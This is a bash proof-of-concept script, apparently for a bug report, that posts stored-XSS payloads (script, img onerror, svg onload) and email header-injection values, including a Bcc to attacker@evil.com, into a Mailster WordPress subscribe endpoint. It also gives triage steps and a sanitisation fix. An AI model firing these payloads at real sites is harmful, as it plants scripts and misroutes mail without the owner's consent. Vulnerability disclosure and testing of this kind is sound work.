#!/bin/bash
clear
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   PoC - Mailster Input Without Sanitization                 ║"
echo "║   cyberc4st.com | CWE-20                                    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

ENDPOINT="https://cyberc4st.com/wp-json/mailster/v1/forms/1/subscribe"
PASS=0
FAIL=0

test_payload() {
  local id="$1" desc="$2" payload="$3"
  local email="poc${id}_$(date +%s)@gmail.com"
  local jsonfile="/tmp/poc_${id}.json"
  
  printf "🧪 Test %d : %s\n" "$id" "$desc"
  printf "   Payload : %s\n" "$payload"
  
  cat > "$jsonfile" << JSONEOF
{
  "email": "${email}",
  "firstname": "${payload}"
}
JSONEOF
  
  local http=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d @"$jsonfile" \
    -w "%{http_code}" -o /dev/null)
  
  rm -f "$jsonfile"
  
  if [ "$http" = "200" ]; then
    echo "   ✅ ACCEPTÉ (HTTP $http)"
    PASS=$((PASS+1))
  else
    echo "   ❌ REJETÉ (HTTP $http)"
    FAIL=$((FAIL+1))
  fi
  echo ""
  sleep 0.3
}

echo "══════════════════════════════════════════════════════════════"
echo "                   LANCEMENT DES 7 TESTS                     "
echo "══════════════════════════════════════════════════════════════"
echo ""

test_payload 1 "XSS <script>"               '<script>alert(1)</script>'
test_payload 2 "XSS <img onerror>"          '<img src=x onerror=alert(1)>'
test_payload 3 "XSS <svg onload>"           '<svg onload=alert(1)>'
test_payload 4 "XSS <body onload>"          '<body onload=alert(1)>'
test_payload 5 "Header Injection (Bcc)"     'Test\nBcc: attacker@evil.com'
test_payload 6 "Header Injection (From)"    'Test\nFrom: admin@cyberc4st.com'
test_payload 7 "Valeur normale (contrôle)"  'Jean Dupont'

echo "══════════════════════════════════════════════════════════════"
echo "                       RÉSUMÉ                                "
echo "══════════════════════════════════════════════════════════════"
echo ""
echo "   ✅ Acceptés : $PASS/7"
echo "   ❌ Rejetés  : $FAIL/7"
echo ""

if [ $PASS -ge 1 ]; then
  echo "🚨 $PASS/7 payloads acceptés sans filtrage."
  echo ""
  echo "📌 VÉRIFICATION TRIAGE :"
  echo "   Admin WP → Mailster → Abonnés"
  echo "   Vérifier si les payloads s'exécutent."
  echo ""
  echo "   → Exécution = Stored XSS Critical"
  echo "   → Échappé   = CWE-20 Low"
fi

echo ""
echo "🔧 Remédiation : sanitize_text_field() ou htmlspecialchars()"
echo "══════════════════════════════════════════════════════════════"
